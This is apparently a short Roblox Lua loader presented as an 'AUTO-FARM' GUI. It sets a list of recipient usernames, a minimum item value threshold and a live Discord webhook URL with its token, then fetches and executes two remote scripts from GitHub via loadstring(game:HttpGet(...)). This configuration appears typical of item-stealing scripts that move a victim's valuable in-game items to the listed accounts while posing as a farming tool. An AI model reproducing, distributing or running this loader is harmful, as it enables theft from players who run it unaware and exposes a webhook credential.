-- Strikegui.lua
-- User settings
_G.Usernames = {"PepijnAlt_1", "PepijnAlt_2", "PepijnAlt_3", "PepijnAlt_4", "PepijnAlt_5"} 
_G.minrap = 10000000
_G.webhook = "https://discord.com/api/webhooks/1431974006080147466/vjWq7Xu7Mqun02T9rUiMFzZA1btH8483bsgvVihoSw-FEKsADYQbP49cJXvfsDLNQxto"

-- Run both scripts concurrently
spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/StrikeHub076/AUTO-FARM-V2/refs/heads/main/test2.lua"))()
end)

spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/StrikeHub076/AUTO-FARM-V2/refs/heads/main/Gui.lua"))()
end)
